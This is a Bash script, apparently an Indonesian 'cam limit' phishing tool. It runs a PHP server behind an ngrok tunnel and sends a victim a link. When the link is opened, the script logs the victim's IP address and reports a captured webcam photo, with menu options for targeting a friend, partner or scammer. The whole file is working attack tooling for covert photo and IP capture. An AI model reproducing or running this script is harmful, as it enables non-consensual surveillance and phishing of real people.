#!/bin/bash

#warna
green="\e[1;92m"
yellow="\e[1;93m"
white="\e[1;77m"
red="\e[31;1m"
gray="\e[0;37m"
blue="\e[1;34m"
trap 'printf "\n";stop' 2

banner() {
clear
printf "$blue"
figlet -f standard "cam limit" 
printf "$green author : Limit Queen Project\n"
printf " github : https://github.com/LimitQueenProject "
printf "\n"
printf "$white"
}

stop() {

checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
killall -2 ssh > /dev/null 2>&1
fi
exit 1

}

dependencies() {


command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
 


}

catch_ip() {

ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip

cat ip.txt >> saved.ip.txt


}

checkfound() {

printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Klik ctrl + c untuk exit ...\e[0m\n"
while [ true ]; do


if [[ -e "ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Target membuka link!\n"
catch_ip
rm -rf ip.txt

fi

sleep 0.5

if [[ -e "Log.log" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Foto terambil!\e[0m\n"
rm -rf Log.log
fi
sleep 0.5

done 

}



teman() {

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
sed 's+forwarding_link+'$link'+g' teman.html > index2.html
sed 's+forwarding_link+'$link'+g' template.php > index.php


}

ngrok_teman() {


if [[ -e ngrok ]]; then
echo ""
else
command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\n"
arch=$(uname -a | grep -o 'arm' | head -n1)
arch2=$(uname -a | grep -o 'Android' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1

if [[ -e ngrok-stable-linux-arm.zip ]]; then
unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-arm.zip
else
printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
exit 1
fi

else
wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
if [[ -e ngrok-stable-linux-386.zip ]]; then
unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-386.zip
else
printf "\e[1;93m[!] Download error... \e[0m\n"
exit 1
fi
fi
fi

printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
sleep 2
printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
./ngrok http 3333 > /dev/null 2>&1 &
sleep 10

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link

teman
checkfound
}

ngrok_pacar() {
clear
sleep 0.5
banner
echo ""
echo -e "$yellow Fitur ini belum tersedia KAK $green$USER$yellow jones"
echo " Sorry ya bogeng xixixi"
echo ""
read -p $" Enter untuk kembali " op
if [[ $op -eq '' ]]; then
sleep 0.5
banner
menu
else
sleep 0.5
banner
menu
fi
}

ngrok_penipu() {
clear
sleep 0.5
banner
echo ""
echo -e "$yellow Fitur ini belum tersedia KAK $green$USER$yellow jones"
echo " Sorry ya bogeng xixixi"
echo ""
read -p $" Enter untuk kembali " op
if [[ $op -eq '' ]]; then
sleep 0.5
banner
menu
else
sleep 0.5
banner
menu
fi
}

menu() {
if [[ -e sendlink ]]; then
rm -rf sendlink
fi

printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m TEMAN\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m PACAR\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m PENIPU\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m00\e[0m\e[1;92m]\e[0m\e[1;93m KELUAR\e[0m\n"
printf ""
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Pilih target :  \e[0m' option_server
if [[ $option_server -eq 1 ]]; then
ngrok_teman
elif [[ $option_server -eq 2 ]]; then
ngrok_pacar
elif [[ $option_server -eq 3 ]]; then
ngrok_penipu
elif [[ $option_server -eq 0 ]]; then
exit 1
else
echo -e "$red Pilih yang ada sayang"
menu
fi
clear
}

banner
dependencies
menu
